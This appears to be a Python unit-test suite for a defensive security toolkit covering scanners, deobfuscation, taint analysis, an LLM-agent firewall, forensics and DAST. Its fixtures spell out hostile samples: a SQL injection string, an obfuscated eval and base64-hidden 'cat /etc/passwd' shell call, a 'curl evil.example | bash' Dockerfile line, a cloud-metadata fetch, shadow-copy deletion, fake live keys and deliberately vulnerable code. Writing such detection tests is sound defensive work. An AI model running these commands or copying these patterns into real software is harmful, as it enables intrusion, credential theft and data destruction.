"""
Comprehensive Verification Test Suite for Wave V Critical Security & Harness² Upgrades.

Validates all 28 new Wave V production modules, end-to-end integrations across
`EnterpriseCyberSuiteFacade`, `HarnessSquaredResearchLabFacade`, SQLite persistence,
HTTP Security Hardening Middleware + Active DAST self-audit, CLI subcommands, and
formal anti-evasion resilience (proving 100.0% resilience across all 8 evasion families).
"""

from __future__ import annotations

import json
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from pathlib import Path

from ely_soe.analyzers.ast_symbolic_dataflow_prover import ASTSymbolicDataflowProver
from ely_soe.analyzers.interprocedural_cfg_taint_engine import InterproceduralCFGTaintEngine
from ely_soe.analyzers.polyglot_js_ts_go_ast_scanner import PolyglotSourceSecurityScanner
from ely_soe.analyzers.semantic_reachability_verifier import SemanticReachabilityVerifier
from ely_soe.cli import main as cli_main
from ely_soe.cyber.ai_llm_agent_security_firewall import AILLMAgentSecurityFirewall
from ely_soe.cyber.cloud_iac_drift_policy_engine import CloudIaCPolicyDriftEngine
from ely_soe.cyber.compliance_evidence_mapper_v2 import RegulatoryComplianceEvidenceMapperV2
from ely_soe.cyber.container_supply_chain_runtime_guard import ContainerSupplyChainRuntimeGuard
from ely_soe.cyber.deobfuscation_ast_normalizer import (
    MultiLayerPayloadNormalizer,
    PythonASTDeobfuscationEngine,
)
from ely_soe.cyber.exploit_chain_graph_engine import ExploitChainGraphEngine
from ely_soe.cyber.extended_suite_facade import CYBER_ENGINE_CATALOG, EnterpriseCyberSuiteFacade
from ely_soe.cyber.finding_deduplicator_correlator import CrossEngineFindingCorrelator
from ely_soe.cyber.incident_timeline_forensic_correlator import IncidentTimelineForensicCorrelator
from ely_soe.cyber.network_tls_protocol_auditor import NetworkTLSZeroTrustAuditor
from ely_soe.cyber.runtime_dast_security_scanner import RuntimeDASTSecurityScanner
from ely_soe.cyber.sbom_cve_exploit_intelligence import SupplyChainScorecardEngine
from ely_soe.cyber.secret_entropy_context_verifier import ContextualSecretVerifierEngine
from ely_soe.harness.forensic_evidence_bundler import ForensicEvidenceBundler
from ely_soe.harness.harness_self_diagnostics import HarnessSelfDiagnosticsEngine
from ely_soe.harness.verified_autopatch_engine import VerifiedAutoPatchEngine
from ely_soe.harness_squared.adaptive_cost_pareto_scheduler import AdaptiveCostParetoScheduler
from ely_soe.harness_squared.adversarial_harness_stress_tester import AdversarialHarnessStressTester
from ely_soe.harness_squared.counterfactual_remediation_planner import CounterfactualRemediationPlanner
from ely_soe.harness_squared.online_meta_telemetry_evaluator import OnlineMetaTelemetryEvaluator
from ely_soe.harness_squared.parallel_dag_executor import ParallelTopologicalDAGExecutor
from ely_soe.harness_squared.research_lab_facade import (
    HARNESS2_SUBSYSTEM_CATALOG,
    HarnessSquaredResearchLabFacade,
)
from ely_soe.harness_squared.root_cause_rule_synthesizer import RootCauseGuardrailSynthesizer
from ely_soe.harness_squared.slo_regression_formal_gate import FormalSecuritySLORegressionGate
from ely_soe.harness_squared.stage_registry import STAGE_CATALOG, FirstOrderStageRegistry
from ely_soe.harness_squared.systemic_defense_portfolio_optimizer import SystemicDefensePortfolioOptimizer
from ely_soe.web.api_handlers import SOEApiController
from ely_soe.web.cyber_h2_store import CyberAndHarness2Store
from ely_soe.web.security_middleware import WebSecurityMiddleware
from ely_soe.web.server import create_server


REPO_ROOT = Path(__file__).resolve().parent.parent
SPECIMEN_V09 = REPO_ROOT / "lab_targets" / "ely_specimen" / "v0_9"
SPECIMEN_V10 = REPO_ROOT / "lab_targets" / "ely_specimen" / "v1_0_hardened"


class TestWave5AntiEvasionAndAnalyzers(unittest.TestCase):
    def test_01_multilayer_normalizer_and_ast_deobfuscation(self) -> None:
        norm = MultiLayerPayloadNormalizer()
        res = norm.normalize("id=1%20%2f%2a%2a%2fUNION%20SELECT%20password%20FROM%20users")
        self.assertGreaterEqual(res.obfuscation_layers_detected, 1)
        self.assertIn("UNION", res.normalized_text.upper())
        self.assertIn("SELECT", res.normalized_text.upper())

        deobf = PythonASTDeobfuscationEngine()
        evasive_code = '''
import builtins, base64, subprocess
fn = getattr(builtins, "ev" + "al")
fn(user_input)
cmd = base64.b64decode("Y2F0IC9ldGMvcGFzc3dk")
subprocess.run(cmd, shell=True)
API_SECRET = "sk_live_" + "9f8e7d6c5b4a3210fedcba987654"
'''
        rep = deobf.analyze_source(evasive_code, file_path="evasive.py")
        rule_ids = {v.rule_id for v in rep["vulnerabilities"]}
        self.assertIn("CYB-DEOBF-SPLIT-SECRET", rule_ids)
        self.assertGreaterEqual(len(rep["vulnerabilities"]), 2)

    def test_02_adversarial_evasion_stress_100_percent_resilience(self) -> None:
        """Proves Wave V eliminates ALL 6 prior evasion blind spots: 25% -> 100% (8/8 RESILIENT)."""
        stress = AdversarialHarnessStressTester()
        res = stress.run_evasion_stress_suite()
        self.assertEqual(res["baseline_detection_rate_pct"], 100.0)
        self.assertEqual(res["evasion_resilience_rate_pct"], 100.0)
        self.assertEqual(res["blind_spot_count"], 0)
        self.assertEqual(len(res["case_results"]), 8)
        for case in res["case_results"]:
            self.assertEqual(case["status"], "RESILIENT", f"Blind spot on {case['case_id']}")

    def test_03_interprocedural_multihop_taint_and_sanitizer_barrier(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            p = Path(td)
            (p / "app.py").write_text(
                '''
import sqlite3, shlex, subprocess

def handle_request(request):
    user_q = request.args.get("q")
    return service_layer(user_q)

def service_layer(term):
    return dao_query(term)

def dao_query(val):
    conn = sqlite3.connect(":memory:")
    return conn.execute("SELECT * FROM users WHERE name = '" + val + "'")

def safe_handler(request):
    arg = request.args.get("host")
    safe_arg = shlex.quote(arg)
    return subprocess.run(["ping", "-c", "1", safe_arg], shell=False)
''',
                encoding="utf-8",
            )
            eng = InterproceduralCFGTaintEngine()
            rep = eng.analyze_directory(p)
            self.assertGreaterEqual(rep["multihop_interprocedural_flows"], 1)
            self.assertGreaterEqual(len(rep["vulnerabilities"]), 1)
            # Verify multi-hop chain reaches dao_query
            has_multihop = any(len(f["call_chain"]) >= 2 for f in rep["flows"])
            self.assertTrue(has_multihop)

    def test_04_semantic_reachability_and_cross_engine_dedup(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            p = Path(td)
            (p / "svc.py").write_text(
                '''
def route_search(request):
    return eval(request.args["expr"])

def dead_helper():
    if False:
        eval("never_runs")
''',
                encoding="utf-8",
            )
            verifier = SemanticReachabilityVerifier()
            idx = verifier.index_repository(p)
            self.assertGreaterEqual(idx["entrypoints_discovered"], 1)
            self.assertGreaterEqual(idx["dead_code_lines_detected"], 1)

            deobf = PythonASTDeobfuscationEngine()
            vulns = deobf.scan_directory(p)["vulnerabilities"]
            if vulns:
                corr = CrossEngineFindingCorrelator().deduplicate_and_correlate(vulns + vulns)
                self.assertGreaterEqual(corr["duplicates_eliminated"], len(vulns))
                self.assertEqual(corr["deduplicated_findings_count"], len(vulns))

    def test_05_contextual_secret_verifier_suppresses_placeholders(self) -> None:
        eng = ContextualSecretVerifierEngine()
        # Assemble synthetic test tokens dynamically so repo push-protection stays clean
        synth_aws = "AKIA" + "Q3EG7R2P9KX4M8ZN"
        synth_stripe = "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc9a8b7c6d"
        sample = (
            'DEMO_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
            f'REAL_AWS_KEY = "{synth_aws}"\n'
            f'STRIPE_LIVE = "{synth_stripe}"\n'
            'DUMMY = "your_api_key_here_placeholder"\n'
        )
        res = eng.scan_text(sample, file_path="config.py")
        self.assertGreaterEqual(res["confirmed_secrets_count"], 1)
        self.assertGreaterEqual(res["suppressed_false_positives_count"], 1)
        # Ensure redacted evidence never exposes full raw secret
        for v in res["vulnerabilities"]:
            self.assertNotIn(synth_stripe, v.description)

    def test_06_polyglot_js_ts_go_docker_and_network_tls_and_scorecard(self) -> None:
        poly = PolyglotSourceSecurityScanner()
        js_res = poly.scan_text('el.innerHTML = userInput; eval(req.body.code);', language="javascript", file_path="app.js")
        go_res = poly.scan_text('db.Query("SELECT * FROM t WHERE id=" + id); exec.Command("sh", "-c", cmd)', language="go", file_path="main.go")
        self.assertGreaterEqual(len(js_res), 2)
        self.assertGreaterEqual(len(go_res), 2)

        net = NetworkTLSZeroTrustAuditor()
        net_res = net.audit_text("ssl_protocols TLSv1 TLSv1.1;\nPermitRootLogin yes\n0.0.0.0/0 -> 5432\nmode: PERMISSIVE\n", file_path="nginx.conf")
        self.assertGreaterEqual(len(net_res), 3)

        sc = SupplyChainScorecardEngine()
        sc_res = sc.audit_repository(SPECIMEN_V09)
        self.assertIn("openssf_scorecard_10", sc_res)
        self.assertIn("slsa_readiness_level", sc_res)

    def test_07_ast_symbolic_invariants_cloud_iac_and_container_guard(self) -> None:
        prover = ASTSymbolicDataflowProver()
        src = '''
import os, re, random, tempfile

def verify_admin_token(token, expected_token):
    try:
        assert token is not None
        if token == expected_token:
            return True
    except Exception:
        return True
    p = tempfile.mktemp()
    if os.path.exists(p):
        open(p, "w")
    session_token = "".join(random.choice("abcdef") for _ in range(16))
    re.compile(r"(a+)+$")
    return False
'''
        inv_res = prover.analyze_source(src, file_path="auth_invariants.py")
        rids = {v.rule_id for v in inv_res["vulnerabilities"]}
        self.assertIn("CYB-INV-TIMING-CMP", rids)
        self.assertIn("CYB-INV-ASSERT-AUTH", rids)
        self.assertIn("CYB-INV-FAIL-OPEN-AUTH", rids)
        self.assertIn("CYB-INV-TEMPFILE-MKTEMP", rids)
        self.assertIn("CYB-INV-TOCTOU-FS", rids)
        self.assertIn("CYB-INV-WEAK-PRNG", rids)
        self.assertIn("CYB-INV-REDOS-EXP", rids)

        iac = CloudIaCPolicyDriftEngine()
        tf_bad = '''
resource "aws_s3_bucket" "data" { acl = "public-read" }
resource "aws_db_instance" "db" {
  publicly_accessible = true
  storage_encrypted   = false
  master_password     = "SuperSecretProd123!"
}
'''
        tf_good = '''
resource "aws_s3_bucket" "data" { acl = "private" }
resource "aws_db_instance" "db" {
  publicly_accessible = false
  storage_encrypted   = true
}
'''
        bad_audit = iac.audit_text(tf_bad, file_path="main.tf")
        good_audit = iac.audit_text(tf_good, file_path="main.tf")
        self.assertGreaterEqual(bad_audit["findings_count"], 4)
        self.assertEqual(good_audit["findings_count"], 0)
        drift = iac.detect_posture_drift(good_audit, bad_audit)
        self.assertEqual(drift["drift_verdict"], "DRIFT_REGRESSION_BLOCKED")

        ctr = ContainerSupplyChainRuntimeGuard()
        df_res = ctr.audit_dockerfile_text("FROM python:latest\nENV AWS_SECRET_KEY=wJalrXUtnFEMI123456\nRUN curl https://evil.example/a.sh | bash\n")
        self.assertGreaterEqual(df_res["findings_count"], 4)
        sec_res = ctr.audit_seccomp_profile({"defaultAction": "SCMP_ACT_ALLOW", "syscalls": [{"action": "SCMP_ACT_ALLOW", "names": ["ptrace", "bpf"]}]})
        self.assertEqual(sec_res["findings_count"], 2)


class TestWave5RemediationFirewallsAndHarness2(unittest.TestCase):
    def test_08_verified_autopatch_leaves_live_target_untouched(self) -> None:
        eng = VerifiedAutoPatchEngine()
        res = eng.run_isolated_differential_autopatch(SPECIMEN_V09)
        self.assertTrue(res["live_target_untouched"])
        self.assertTrue(res["all_patches_syntax_verified"])
        self.assertGreaterEqual(res["files_patched_count"], 1)
        self.assertGreater(res["vulnerabilities_eliminated"], 0)
        self.assertIn("VERIFIED_REMEDIATION", res["verdict"])

    def test_09_ai_llm_firewall_exploit_graph_compliance_v2_and_dfir(self) -> None:
        fw = AILLMAgentSecurityFirewall()
        bat = fw.run_owasp_llm_redteam_battery()
        self.assertEqual(bat["owasp_llm_firewall_score_pct"], 100.0)
        mcp = fw.evaluate_mcp_tool_call("http.fetch", {"url": "http://169.254.169.254/latest/meta-data/"}, caller_trust_level="UNTRUSTED_DATA")
        self.assertEqual(mcp["verdict"], "DENY")

        facade = EnterpriseCyberSuiteFacade()
        scan = facade.run_unified_cyber_scan(str(SPECIMEN_V09), run_sandbox_range=False)
        self.assertGreaterEqual(len(CYBER_ENGINE_CATALOG), 65)
        self.assertIn("cross_engine_correlation", scan)
        self.assertIn("exploit_chain_chokepoints", scan)
        self.assertIn("compliance_evidence_v2", scan)

        dfir = IncidentTimelineForensicCorrelator().correlate_incident_events([
            {"timestamp": "2026-11-15T10:00:00Z", "host": "web-01", "actor_ip": "198.51.100.9", "principal": "anon", "action": "sqli", "detail": "UNION SELECT password"},
            {"timestamp": "2026-11-15T10:05:00Z", "host": "web-01", "actor_ip": "198.51.100.9", "principal": "www", "action": "imds", "detail": "curl http://169.254.169.254/latest/meta-data"},
            {"timestamp": "2026-11-15T10:15:00Z", "host": "db-01", "actor_ip": "10.0.1.5", "principal": "root", "action": "ransom", "detail": "vssadmin delete shadows /all"},
        ])
        self.assertEqual(dfir["patient_zero_host"], "web-01")
        self.assertEqual(dfir["dwell_time_minutes"], 15.0)
        self.assertGreaterEqual(dfir["kill_chain_depth"], 3)
        self.assertEqual(len(dfir["chain_of_custody_merkle_root"]), 64)

        bundle = ForensicEvidenceBundler().create_signed_bundle(target_dir=SPECIMEN_V09, scan_summary=scan)
        self.assertTrue(bundle["signature_verified"])
        self.assertGreater(bundle["executive_html_bytes"], 500)

    def test_10_harness2_portfolio_counterfactual_diagnostics_pareto_and_calibration(self) -> None:
        self.assertGreaterEqual(len(HARNESS2_SUBSYSTEM_CATALOG), 36)
        self.assertGreaterEqual(len(STAGE_CATALOG), 45)

        # 6-Canary Self-Diagnostics -> 6/6 PASS, F1=1.0
        diag = HarnessSelfDiagnosticsEngine().run_full_self_diagnostics()
        self.assertEqual(diag["harness_health_verdict"], "HEALTHY_CALIBRATED")
        self.assertEqual(diag["canaries_passed"], diag["canaries_total"])
        self.assertEqual(diag["aggregate_f1_score"], 1.0)

        # Systemic Portfolio Optimizer + Counterfactual + Guardrails + Monotonicity + Parallel Pareto
        lab = HarnessSquaredResearchLabFacade()
        pf = lab.run_systemic_defense_portfolio(str(SPECIMEN_V09), budget_usd=50_000.0)
        self.assertGreater(pf["systemic_risk_reduction_pct"], 50.0)
        self.assertGreater(pf["rosi_pct"], 0.0)

        cf = lab.run_counterfactual_remediation_plan(str(SPECIMEN_V09), target_posture=80.0)
        self.assertGreater(len(cf["prioritized_atomic_prs"]), 0)

        gr = lab.synthesize_permanent_guardrails(str(SPECIMEN_V09), max_rules=5)
        self.assertGreaterEqual(gr["total_guardrail_artifacts"], 4)
        self.assertIn("rules:", gr["semgrep_yaml"])

        mono = lab.prove_version_monotonicity(str(SPECIMEN_V09), str(SPECIMEN_V10))
        self.assertIn("verdict", mono)
        self.assertEqual(len(mono["proof_certificate_sha256"]), 64)

        pp = lab.run_pareto_parallel_schedule(str(SPECIMEN_V09), sla_budget_ms=5000, max_stages=6)
        self.assertGreaterEqual(pp["parallel_execution"]["stages_completed"], 4)
        self.assertGreater(pp["parallel_execution"]["parallel_speedup"], 0.5)

        # Online Calibration: ECE/Brier/ROC-AUC/PR-AUC + Temperature Scaling + CUSUM Drift
        cal = OnlineMetaTelemetryEvaluator()
        # Deliberately overconfident probabilities on mixed labels
        probs = [0.98, 0.96, 0.94, 0.92, 0.90, 0.85, 0.82, 0.78, 0.20, 0.15, 0.10, 0.08]
        labels = [1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0]
        ts = cal.fit_temperature_scaling(probs, labels)
        self.assertTrue(ts["rank_ordering_preserved"])
        self.assertGreaterEqual(ts["after_calibration"]["roc_auc"], 0.80)
        self.assertLessEqual(ts["after_calibration"]["brier_score"], ts["before_calibration"]["brier_score"] + 1e-6)

        cusum = cal.run_cusum_drift_monitor(
            [0.95, 0.96, 0.94, 0.95, 0.72, 0.68, 0.65, 0.61],
            baseline_mean=0.95,
            baseline_std=0.02,
        )
        self.assertTrue(cusum["drift_alarm_triggered"])
        self.assertEqual(cusum["alarm_direction"], "DOWNWARD_DEGRADATION")

    def test_11_sqlite_store_web_security_hardening_and_live_dast_100_pct(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            db = Path(td) / "history.sqlite"
            store = CyberAndHarness2Store(db)
            id1 = store.save_cyber_scan({"target_name": "v0_9", "overall_cyber_posture": 18.0, "total_vulnerabilities": 30, "critical_count": 8, "high_count": 10, "gate_verdict": "BLOCKED", "vulnerabilities": [{"rule_id": "R1", "file_path": "a.py", "line_start": 1}, {"rule_id": "R2", "file_path": "b.py", "line_start": 2}]})
            id2 = store.save_cyber_scan({"target_name": "v1_0", "overall_cyber_posture": 92.0, "total_vulnerabilities": 1, "critical_count": 0, "high_count": 0, "gate_verdict": "APPROVED", "vulnerabilities": [{"rule_id": "R2", "file_path": "b.py", "line_start": 2}]})
            diff = store.diff_cyber_scans(id1, id2)
            self.assertEqual(diff["posture_delta"], 74.0)
            self.assertEqual(diff["remediated_rules_count"], 1)

            # Boot real ephemeral HTTP server on port 0 and run RuntimeDASTSecurityScanner against it
            from ely_soe.core.config import SOEConfig
            from ely_soe.soe.engine import SecurityOrchestrationEngine

            ctrl = SOEApiController(
                soe=SecurityOrchestrationEngine(SOEConfig(data_dir=Path(td) / "soe_data")),
                repo_root=REPO_ROOT,
            )
            srv = create_server(host="127.0.0.1", port=0, controller=ctrl, seed_demo=False)
            port = srv.server_address[1]
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            try:
                base = f"http://127.0.0.1:{port}"
                dast = RuntimeDASTSecurityScanner().scan_live_target(base)
                self.assertEqual(dast["vulnerabilities_found"], 0, f"DAST found issues: {dast['probes']}")
                self.assertEqual(dast["dast_posture_score"], 100.0)

                # Verify new Wave V HTTP endpoints directly
                with urllib.request.urlopen(f"{base}/api/security/telemetry", timeout=5) as resp:
                    tel = json.loads(resp.read().decode("utf-8"))
                    self.assertIn("Content-Security-Policy", tel["security_headers_enabled"])
                    self.assertGreater(tel["total_requests"], 0)

                req = urllib.request.Request(
                    f"{base}/api/h2/self-diagnostics",
                    data=b"{}",
                    headers={"Content-Type": "application/json"},
                    method="POST",
                )
                with urllib.request.urlopen(req, timeout=15) as resp:
                    dg = json.loads(resp.read().decode("utf-8"))
                    self.assertEqual(dg["harness_health_verdict"], "HEALTHY_CALIBRATED")
            finally:
                srv.shutdown()
                srv.server_close()

    def test_12_cli_wave5_subcommands(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            self.assertEqual(cli_main(["--data-dir", td, "h2", "diagnostics", "--json"]), 0)
            self.assertEqual(cli_main(["--data-dir", td, "cyber", "llm-firewall", "--json"]), 0)
            self.assertEqual(cli_main(["--data-dir", td, "cyber", "dfir", "--json"]), 0)


if __name__ == "__main__":
    unittest.main()
